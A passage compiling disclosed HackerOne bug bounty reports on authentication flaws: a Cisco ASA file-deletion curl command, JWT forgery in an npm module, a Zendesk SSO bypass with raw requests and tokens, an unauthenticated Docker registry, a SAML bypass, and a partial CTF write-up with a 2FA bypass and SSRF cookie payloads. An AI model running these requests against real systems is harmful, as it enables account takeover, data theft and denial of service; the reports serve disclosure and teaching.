 1. To delete this just hit the following command on your terminals.
     `curl -H “Cookie: token=../+CSCOU+/csco_logo.gif” https://█████████/+CSCOE+/session_password.html`

     If that did not work because sometimes logo.gif/png has permission issues so try this <https://█████/+CSCOE+/blank.html>

 2. You can also delete the file "`/+CSCOE+/blank.html`" (an empty HTML file), as it might be a problem with the permission of the custom logo file sometimes logo.gif has permission issue so we might not be able to delete but we can delete other files

Warning : This can lead to a denial of service (DOS) on the VPN by deleting the lua source code files from the file system, which will break the WebVPN interface until the device is rebooted.

Now i haven't deleted the logo file because i didn't wanted to cause any damage so i used another method which can help us confirming that target is vulnerable to this without causing damage and for that just check if `/+CSCOE+/session_password.html` endpoint exists, and it gives "200 OK" status, then it should be vulnerable because this affected endpoint has been removed from the patched versions.

I sent a curl request to check and it gave 200 ok as shown below:
`/+CSCOE+/session_password.html -> 200 = Vulnerable`
`/+CSCOE+/session_password.html -> 404 = Patched`

**Mitigation/Remediation Actions:**

Upgrade the ASA software version per the referenced advisory. This advisory is available at the following link:
<https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43>

**Reference:**

<https://twitter.com/aboul3la/status/1286809567989575685>
<https://medium.com/@parasarora06/hunting-for-cve-2020-3187-2020-3452-9f0dcc66f4d8>
<https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43>
<http://packetstormsecurity.com/files/158648/Cisco-Adaptive-Security-Appliance-Software-9.7-Arbitrary-File-Deletion.html>

## Impact

High - This vulnerability allows the attacker to delete files within the web services file system.

---

### [Recently change email but still login with old email](https://hackerone.com/reports/986459)

- **Report ID:** `986459`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Nextcloud
- **Reporter:** @xcracker420
- **Bounty:** - usd
- **Disclosed:** 2020-09-29T07:46:12.394Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team, 
I have been found vulnerability on email verification which can be account takeover (Authentication bypass)
Recently I have been change my email ████ but still login with old email ██████
--https://efss.qloud.my/index.php/settings/user

## Impact

Impact
If victim's email account is still logged into his/her old gmail account . Then any external attacker can use the unused same email for account takeover
https://efss.qloud.my/index.php/settings/user

---

### [[authmagic-timerange-stateless-core] Improper Authentication](https://hackerone.com/reports/736522)

- **Report ID:** `736522`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @ermilov
- **Bounty:** - usd
- **Disclosed:** 2020-09-16T05:07:49.580Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report Improper Authentication in `authmagic-timerange-stateless-core`
It allows to forge user's identity.

# Module

**module name:** authmagic-timerange-stateless-core
**version:** 0.0.9
**npm page:** `https://www.npmjs.com/package/authmagic-timerange-stateless-core`

## Module Description

Stateless and passwordless authentication core for authmagic (https://github.com/authmagic/authmagic).

## Module Stats

[20] weekly downloads

# Vulnerability

## Vulnerability Description

`authmagic-timerange-stateless-core` is an npm module that runs an API for stateless and passwordless authentication by utilizing JWT tokens. The module is also one of the core dependencies of `authmagic` which is an authorization service.
The module defined to handle authentication but does not validate the JWT token sent by the user when reissuing a new token (POST request to `/token` endpoint). Therefore it allows modifying payload within the token and also reissuing new token which will be signed by the system and become valid. This weakness provides an opportunity to forge the user's identity by changing the information inside the token's payload that is used to authenticate the client.

## Steps To Reproduce:

source code example:

https://github.com/authmagic/authmagic-timerange-stateless-core/blob/master/core.js#L11

```javascript
const checkRefreshToken = (token, refreshToken, key) => {
  try {
    if(jwt.verify(refreshToken, key)) {
      return jwt.decode(token, {complete: true}).signature === jwt.decode(refreshToken).signature;
    }
  } catch(e) {
    return false;
  }

  return false;
};
```
while comparing signatures in `token` and `refreshToken` only the `refreshToken` is verified, the `token` itself has to include the same sign like the one stored in `refreshToken`'s payload but the validity of the `token` is not checked.

the `authmagic-timerange-stateless-core` is utilized by `Authmagic` (https://github.com/authmagic/authmagic) so it is handy to use `Authmagic example app` (https://github.com/authmagic/authmagic-getting-started-example) for testing, as it demonstrates the behaviour of the module in a situation that is near to production.

* create directory for testing
```bash
mkdir poc
cd poc/
```

* install and run authmagic example app
```bash
npm install -g authmagic-cli
npm init -y
authmagic init -e
authmagic install
authmagic
```

```
Note: make sure name in your package.json is not named as authmagic if you do not want to get an error npm refusing to install as a dependency of itself.
```

* go to http://localhost:3000
F632927

* enter email and click `Send authorization link`
* follow `Preview url` form the console (similar to one on screenshot)
F632928

* follow `Click here`
F632929
```
Note: next I provide steps to intercept and change jwt token with BurpSuite and its JSON Web Tokens (JWT4B) plugin, as it is the easiest and quick way if more detailed explanation required let me know.
```

* click 'Refresh token' and intercept its request
F632930
F632931

* change payload parameter `u` inside `token` (e.g with `JSON Web Tokens (JWT4B)` plugin)
F632932
F632933
* different email will be displayed
F632934

While testing you can put a breakpoint in `poc/node_modules/authmagic-timerange-stateless-core/core.js` file to line 10:
```
const checkRefreshToken = (token, refreshToken, key) => {
  try {
    if(jwt.verify(refreshToken, key)) {
...
```

or add a console.log after it like to this 
```javascript
console.log(jwt.decode(token, {complete: true}), jwt.decode(refreshToken));
```
to make sure that it is the `authmagic-timerange-stateless-core` responsible for handling token verification

## Patch

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Linux Mint current
- NODEJS VERSION: 12.7.0
- NPM VERSION: 6.10.0

# Wrap up

- I contacted the maintainer to let them know: [N]
- I opened an issue in the related repository: [N]

## Impact

This weakness provides opportunity to forge user's identity by changing information inside token's payload that is used to verify the client.

**Summary (researcher):**

Research based on this and other JWT related H1 reports:
https://r2c.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/

---

### [SSO bypass in zendesk using trint organization able to leak internal ticket information](https://hackerone.com/reports/734936)

- **Report ID:** `734936`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Trint Ltd
- **Reporter:** @sopankbegitu
- **Bounty:** - usd
- **Disclosed:** 2020-08-24T15:43:29.461Z
- **CVE(s):** -

**Vulnerability Information:**

#Summary
hello there because in `app.trint.com` there's no email verification i able to login in your `zendesk SSO` using your organization
your organization using domain `*@trint.com` because there's no email verification i able to read and takeover + claim this email
`support+1@trint.com` and i able to login in zendesk SSO using that email.

#How to reproduce
* i registered in `app.trint.com` using this email `support+1@trint.com` until registration step finish
* i check my burp history there's a `graphql` request in this host `https://graphql2.trint.com/`
* i use this query

```
POST / HTTP/1.1
Host: graphql2.trint.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.trint.com/
content-type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWRjOTUwZWEzOGFhMjI3MmExNzAyMzFkIiwiaHR0cHM6Ly9hcHAudHJpbnQuY29tL2lzTmV3VXNlciI6dHJ1ZSwiaHR0cHM6Ly9zY2hlbWEudHJpbnQuY29tL2F1dGhqdGkiOiI0ZmMwMjUyZS03NTFiLTQwNjctOWU0MC00OGQ4MWMzMjRiMjIiLCJpc3MiOiJodHRwczovL3RyaW50LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZGM5NTBlYTM4YWEyMjcyYTE3MDIzMWQiLCJhdWQiOiJ0cmludC1hcGlzIiwiaWF0IjoxNTczNDc0NTQyLCJleHAiOjE1NzYwNjY1NDIsImF6cCI6ImljaDRoeVZZUEtLZ2VFb1RoNmZXUFhjNmZydmVUY1RxIiwiZ3R5IjoicGFzc3dvcmQifQ.JyIc6PZyjidptrvaFT6MykOr0BopUi1F7fZWTvbeKeU
X-Trint-Request-Id: 4b2f23d5-98a3-4571-a9e1-4218cca76e1b
X-Trint-Super-Properties: {}
Origin: https://app.trint.com
Content-Length: 111
Connection: close

{"operationName":null,"variables":{"status":"PENDING"},"query":"query zendeskToken {\n    zendeskToken\n  }\n"}
```

>response header
```
HTTP/1.1 200 OK
Date: Mon, 11 Nov 2019 12:17:06 GMT
Content-Type: application/json
Content-Length: 272
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
Vary: Accept-Encoding

{"data":{"zendeskToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM"}}
```

* i crafted this url `https://trintsupport.zendesk.com/access/jwt?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM`

* boom logged in in ticket using email `support+1@trint.com`

#POC

{F631462}

## Impact

#Impact
* i can read your ticket organization request through `https://support.trint.com/hc/en-us/requests/organization`

---

### [Exposed Docker Registry at https://████](https://hackerone.com/reports/924487)

- **Report ID:** `924487`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0x0d0
- **Bounty:** - usd
- **Disclosed:** 2020-07-30T17:51:58.376Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The docker registry at https://██████ has no authentication in place and is therefore exposed to the public. This leads to full disclosure of all available docker containers, the possibility to upload docker container and manipulate and delete existing docker containers.

**Description:**
From https://www.acunetix.com/vulnerabilities/web/docker-registry-api-is-accessible-without-authentication/ :
The Docker Registry HTTP API is the protocol to facilitate the distribution of images to the docker engine. It interacts with instances of the docker registry, which is a service to manage information about docker images and enable their distribution.

This Docker Registry API is accessible without authentication. A properly secured registry should return 401 when the "/v2/" endpoint is hit without credentials. The response should include a WWW-Authenticate challenge, guiding how to authenticate, such as with basic auth or a token service.

## Impact
High. An attacker can view all available (deployed) docker containers and their containing information, patch the containers to transform the containers to malicious containers (backdoors, malfunction, authentication bypass, RCE, etc.) and upload new possibly malicious containers.  

## Step-by-step Reproduction Instructions
### Viewing and Downloading existing docker containers 
 1. We can examine the existing docker containers by visiting https://██████████/v2/_catalog. We can see that multiple "private" custom docker containers are available (refer to `docker_catalog.png`)
 2. We can download any of these containers with the following command `docker pull █████/<container>`. For example we can download the container `█████████` with `docker pull ███████/███` (refer to `shell_download_container.png`)
 3. At this point we can start the container with `docker run --rm -it █████████/█████ sh` and investigate what is inside the container, to look for credentials and other useful information, etc. (refer to `shell_inside_container.png`)

### Uploading containers
 1. We can not only view all the information in the existing containers, but we are also able to upload containers.
 2. As a proof of concept, I uploaded the default `hello-world` container

```
docker pull hello-world   # Get the hello-world docker
docker tag hello-world:latest ██████/chron0x/hello-world   # Set destination
docker push █████████/chron0x/hello-world   # Push 
```

 3. Carefully observing https://█████/v2/_catalog we can see that the container `chron0x/hello-world` is present (refer to `docker_catalog_chron0x.png`) . The uploaded container is succesfully uploaded and would now be executed server-side. 

### Manipulating existing dockers
Combining the two points above it is also possible to manipulate existing docker containers, by 
 1. Downloading an existing container
 2. Patching the container 
 3. Uploading the container again

With such manipulations backdoors can be planted, the server can be taken over completely, authentications can be bypassed, forced into malfunction etc.
I did not manipulate any of the existing containers since I did not want to mess with the system. I can of course present a manipulation, like planting a file into one of the containers on request.  

## Product, Version, and Configuration (If applicable)
Docker Registry v2

## Suggested Mitigation/Remediation Actions
Restrict access to the Docker Registry API. Except for registries running on secure local networks, registries should always implement access restrictions.

The simplest way to achieve access restriction is through basic authentication (this is very similar to other web servers basic authentication mechanism).

Check all existing docker containers for manipulations, or set them up again from scratch, since they have been potentially been tampered with. 

## Resources:
 * https://www.acunetix.com/vulnerabilities/web/docker-registry-api-is-accessible-without-authentication/
 * https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/

## Impact

High. An attacker can view all available (deployed) docker containers and their containing information, patch the containers to transform the containers to malicious containers (backdoors, malfunction, authentication bypass, RCE, DDOS etc.) and upload new possibly malicious containers.

---

### [Getting SmartDNS for free from -  join.nordvpn.com](https://hackerone.com/reports/925757)

- **Report ID:** `925757`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Nord Security
- **Reporter:** @salahhasoneh
- **Bounty:** - usd
- **Disclosed:** 2020-07-24T09:01:53.429Z
- **CVE(s):** -

**Summary (team):**

The reporter identified an issue within our backend system which performs validation of the active services. There was a misconfiguration related to caching and time period calculation. This lead to SmartDNS service being active for a longer period of time than it should have been, compared with VPN services.

---

### [SAML authentication bypass](https://hackerone.com/reports/812064)

- **Report ID:** `812064`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Rocket.Chat
- **Reporter:** @tomp1
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T17:23:50.076Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

When using SAML authentication, responses are not checked properly. This allows attacker to inject/modify any assertions in the SAML response and thus, for example, authenticate as administrator.

## Description

Following code snippets are from *app/meteor-accounts-saml/server/saml_utils.js*
When checking the signature, the first Signature element which is found in the whole response XML is used:

`316 const signature = xmlCrypto.xpath(doc, '//*[local-name(.)=\'Signature\' and namespace-uri(.)=\'http://www.w3.org/2000/09/xmldsig#\']')[0];`

 After the XML signature has been verified, the code proceeds to use the first Response element found in the whole XML to get assertions and attributes. 

`516 const response = doc.getElementsByTagNameNS('urn:oasis:names:tc:SAML:2.0:protocol', 'Response')[0];`

**However there is no check that the signature that was checked relates to the response element that is being used.** Thus attacker can take a valid SAML response, with some valid signature, and add Response element, that has no signatures, in the beginning of the XML. The code finds the original signature and validates that, but proceeds to use the malicious Response element, which is found first in the document.

Also the validating the status from the response happens before signature validation

`501 const statusValidateObj = self.validateStatus(doc);`

## Releases Affected:

Tested on 3.0.3 but appears to affect all versions based on the history of saml_utils.js file.

## Steps To Reproduce (from initial installation to vulnerability):

  1. Configure the application to use SAML authentication
  1. When logging in, intercept the POST request with a proxy tool
  1. Use the attached `samlbypasspoc.py` file to create a new value for the parameter `SAMLResponse`. Run the script in python3 with the URL encoded SAMLResponse as argument.
  1. Replace the parameter value with the one given by the POC script and forward the request

This requires altering the POC to suite the configuration. Beginning from the line 25, you can alter the response elements as needed to desired values. 

In the sample POC file, attributes `OrganizationName` and `Email` and the element `NameID` are changed. In the setup I tested this resulted in login as a newly created admin.

## Supporting Material/References:

  * samlbypasspoc.py

## Suggested mitigation

  * Refactor the code so that the same elements (references) are used when checking the signature and when reading the attributes
  * Do not use hard coded indexes when selecting the elements

## Impact

SAML authentication can be bypassed and attacker can log in as any user (e.g. admin user)

---

### [[H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties](https://hackerone.com/reports/890196)

- **Report ID:** `890196`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** h1-ctf
- **Reporter:** @fersingb
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T15:39:12.254Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

1. A publicly accessible logfile discloses a user's credentials
2. Weak 2FA implementation allows user account takeover
3. Path injection in user's cookie allows SSRF, bypassing the IP restriction to list available builds on [https://software.bountypay.h1ctf.com/](https://software.bountypay.h1ctf.com/)
4. API token leak in downloaded APK from [https://software.bountypay.h1ctf.com/](https://software.bountypay.h1ctf.com/)
5. Leaked API token allows staff account creation using the staff ID found on Twitter [https://twitter.com/SandraA76708114/status/1258693001964068864](https://twitter.com/SandraA76708114/status/1258693001964068864)
6. Class name injection in HTML elements combined with staff Dashboard report feature leads to privilege escalation as Admin, disclosing the CEO password
7. CSS injection in 2FA app leaks the 2FA code via OOB channel
8. All hackers paid: ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

# Detailed reproduction steps:


# Logging in as regular user (brian.oliver)

Subdomain enumeration on the target [bountypay.h1ctf.com](http://bountypay.h1ctf.com) revealed multiple subdomains:

```
bountypay.h1ctf.com
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
app.bountypay.h1ctf.com
api.bountypay.h1ctf.com
www.bountypay.h1ctf.com
```

During my content discovery phase on those domains, I found an interesting `.git/config` file on [app.bountypay.h1ctf.com](http://app.bountypay.h1ctf.com): 

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

The source code in the GitHub repository leaked the format, name and location of the log file. The file was unprotected on the target system and I downloaded it from this url: [https://app.bountypay.h1ctf.com/bp_web_trace.log](https://app.bountypay.h1ctf.com/bp_web_trace.log)

The log file contains timestamps and information about the HTTP request that was made at that time. The request info is base64 encoded:

```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

This can easily be decoded using a simple for loop in bash:

```bash
$ for line in $(cat bp_web_trace.log) ; do echo $line|cut -d: -f2|base64 -d ; echo ;done
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

I then used those credentials on the login page at [https://app.bountypay.h1ctf.com/](https://app.bountypay.h1ctf.com/) and was greeted with a 2FA form:

{F853775}

I sent a random password and inspected the request in Burp Suite. I saw this:

```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Upgrade-Insecure-Requests: 1

username=brian.oliver&password=V7h0inzX&challenge=13d6718efc0a44576c8aad1a6f193521&challenge_answer=myAnswer
```

The request got a **401 Unauthorized** response, which was expected. Bruteforce was not an option, because of the length of the password and the charset that was used. After playing around with the values, I noticed that the `challenge` ID was actually the md5 hash of the answer. Here is a request that will bypass the 2FA, I used the Hackvector Burp extension because it's convenient, but hashing the answer using any other tool works as well. 

```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Upgrade-Insecure-Requests: 1

username=brian.oliver&password=V7h0inzX&challenge=<@md5_5>a<@/md5_5>&challenge_answer=a 
```

This request got a **302 Found** response with a cookie:

```
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 13:30:33 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Thu, 01-Jul-2020 13:30:33 GMT; Max-Age=2592000
Location: /
Content-Length: 0
```

Using that cookie I was able to successfully log in as Brian Oliver and got access to the BountyPay dashboard:

{F853777}


# Bypassing the IP restriction on [https://software.bountypay.h1ctf.com/](https://software.bountypay.h1ctf.com/) using SSRF

After I got access to the dashboard I started looking at the requests that were made. There was no pending transaction for that user. I tested the parameters for SQLi without success, but the response returned by the server still looked interesting.

Request:

```
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 14:13:03 GMT
Content-Type: application/json
Connection: close
Content-Length: 177

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020","data":"{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"}
```

The `url` returned in the response's JSON was interesting. It looks like the backend is calling an API, using some kind of account ID to construct the path. I tried to call that API directly but this resulted in a **401 Unauthorized**, telling me a token was missing. We'll come back to that later, but right now my only option was to leverage the call made by the server. What if I could control that ID? The user cookie starts with `ey` which is typical of base64 encoded JSON, maybe there is something interesting there. Here is the decoded cookie:

```json
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

The `account_id` field in the decoded cookie matched the account ID used to construct the API URL, so I gave it a try an modified the `account_id` field. Here again, Hackvector is a really useful Burp extension and saves a lot of back and forth between the Repeater and the Decoder.

Request:

```
GET /statements?month=01&year=2019 HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=<@base64_1>{"account_id":"F8gHiqSdpK#","hash":"de235bffd23df6995ad4e0930baac1a2"}<@/base64_1>
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 14:31:10 GMT
Content-Type: application/json
Connection: close
Content-Length: 205

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK#\/statements?month=11&year=2019","data":"{\"account_id\":\"F8gHiqSdpK\",\"owner\":\"Mr Brian Oliver\",\"company\":\"BountyPay Demo \"}"}
```

Bingo, I had control over the request that was made to the API server side. Again, I tested the get parameters for SQLi, hoping I could maybe bypass some special characters filtering by talking directly to the API, but still no luck. I had to find how to leverage that SSRF vulnerability.

I browsed the API home page at [https://api.bountypay.h1ctf.com/](https://api.bountypay.h1ctf.com/) and unfortunately there was no information about any documentation. However I noticed that one link on that page was using a redirect:

{F853783}

During the initial recon phase I discovered multiple subdomains. All of them were accessible, except one:  [software.bountypay.h1ctf.com](http://software.bountypay.h1ctf.com):

{F853790}

This server had an IP restriction in place, probably to restrict the access to internal traffic only, maybe I could get something from it using the SSRF I just found. Again, using Burp Repeater and Hackvector I tried to use the redirect to reach that server.

Request:

```
GET /statements?month=11&year=2019 HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=<@base64_1>{"account_id":"../../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}<@/base64_1>
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 16:51:59 GMT
Content-Type: application/json
Connection: close
Content-Length: 1609

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/statements?month=11&year=2019",
"data":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"}
```

It worked! But this was not the end. The HTML that was returned by the response seems to contain a login form (POST) to access the **Software Storage** service. Since the backend server was performing GET requests, it was not possible to interact with this form. I had to find something else.

I fired up Burp Intruder and started scanning for directories. Again Hackvector made the process a breeze:

```
GET /statements?month=11&year=2019 HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=<@base64_1>{"account_id":"../../../redirect?url=https://software.bountypay.h1ctf.com/§§#","hash":"de235bffd23df6995ad4e0930baac1a2"}<@/base64_1>
```

After some time, I discovered the `uploads` folder that contained the **BountyPay.apk**:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 17:01:42 GMT
Content-Type: application/json
Connection: close
Content-Length: 493

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads#\/statements?month=11&year=2019",
"data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

It wasn't possible to download the APK using the SSRF. Fortunately, the full path to the APK, [https://software.bountypay.h1ctf.com/uploads/BountyPay.apk](https://software.bountypay.h1ctf.com/uploads/BountyPay.apk) was publicly accessible. I downloaded the Android app and started exploring it.


# Getting the API token from the Android app

Once I downloaded the APK I converted it to a jar file using `dex2jar`

```bash
$ d2j-dex2jar BountyPay.apk   
dex2jar BountyPay.apk -> ./BountyPay-dex2jar.jar
```

I then opened the jar file with IntelliJ and stated looking at the code:

{F853780}

The `bounty.pay` package contained some interesting classes. Those classes were also mentioned in the **AndroidManifest.xml** file, where they were configured to listen to some intents:

```xml
	<activity android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="three"/>
            </intent-filter>
        </activity>
